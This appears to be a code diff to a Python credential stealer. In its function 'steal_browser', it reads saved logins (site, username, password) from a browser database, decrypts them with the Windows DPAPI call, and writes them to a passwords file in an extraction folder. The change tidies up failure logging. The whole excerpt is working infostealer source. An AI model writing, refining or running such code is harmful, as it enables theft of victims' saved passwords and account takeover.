@@ -204,8 +204,7 @@ def steal_browser():
                     c.execute("SELECT origin_url, username_value, password_value FROM logins")
                     with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for row in c.fetchall():
-                            blob = bytes(row[2])  # <-- ALWAYS convert to bytes
-
+                            blob = bytes(row[2])
                             if not blob:
                                 continue
 
@@ -215,13 +214,10 @@ def steal_browser():
                                 else:
                                     decrypted_pw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", "ignore")
                             except Exception as e:
-                                decrypted_pw = f"[FAILED: {e}]"
-
-                            # Debug: log failures for troubleshooting
-                            if not decrypted_pw or decrypted_pw.startswith("[FAILED"):
-                                print(f"Failed to decrypt Chrome password for {row[0]} | {row[1]} | BLOB: {blob[:15].hex()}")
+                                decrypted_pw = f"[FAILED: {e}] | BLOB PREFIX: {blob[:10].hex()}"
 
                             f.write(f"[{name}] {row[0]} | {row[1]} | {decrypted_pw}\n")
+
 
 
                 except: pass
